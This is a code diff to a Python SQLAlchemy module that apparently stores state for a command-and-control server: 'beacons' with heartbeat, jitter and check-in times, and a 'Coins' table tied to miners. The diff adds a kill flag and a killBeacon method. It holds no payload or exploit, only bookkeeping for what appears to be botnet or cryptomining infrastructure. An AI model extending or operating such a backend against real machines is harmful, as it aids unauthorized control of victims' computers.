@@ -6,6 +6,7 @@ from sqlalchemy import (
     DateTime,
     ForeignKey,
     exists,
+    Boolean,
 )
 from sqlalchemy.ext.declarative import declarative_base
 from sqlalchemy.orm import sessionmaker
@@ -24,7 +25,7 @@ class Beacons(Base):
     heartbeat = Column(Integer, nullable=False)
     jitter = Column(Integer, nullable=False)
     lastCheckIn = Column(DateTime)
-    nextCheckIn = Column(DateTime)
+    kill = Column(Boolean, nullable=False, default=False)
 
 
 class Coins(Base):
@@ -32,6 +33,7 @@ class Coins(Base):
     id = Column(Integer, primary_key=True)
     miner = Column(String(250), ForeignKey("beacons.mid"))
     kk = Column(String(250), nullable=False)
+
 
 
 # DB methods
@@ -50,9 +52,8 @@ class dbMethods:
             offset = beacon.heartbeat + beacon.jitter
             now = datetime.now()
             beacon.lastCheckIn = now
-            beacon.nextCheckIn = now + timedelta(seconds=offset)
             beacon.ip = ip
-            print(f"Beacon check-in, next: {beacon.nextCheckIn}")
+            beacon.kill = False
         else:
             now = datetime.now()
             new_beacon = Beacons(
@@ -61,10 +62,9 @@ class dbMethods:
                 heartbeat=30,
                 jitter=15,
                 lastCheckIn=now,
-                nextCheckIn=now + timedelta(seconds=45),
+                kill=False,
             )
             self.session.add(new_beacon)
-            print(f"New beacon registered, next: {new_beacon.nextCheckIn}")
         self.session.commit()
 
     def ListBeacons(self):
@@ -75,6 +75,11 @@ class dbMethods:
         h, j = int(h), int(j)
         beacon.heartbeat = h if h >= j else h
         beacon.jitter = j if j <= h else beacon.jitter
+        self.session.commit()
+
+    def killBeacon(self, mid):
+        beacon = self.session.query(Beacons).filter_by(mid=mid).one()
+        beacon.kill = True
         self.session.commit()
 
     def DeleteBeacon(self, mid):
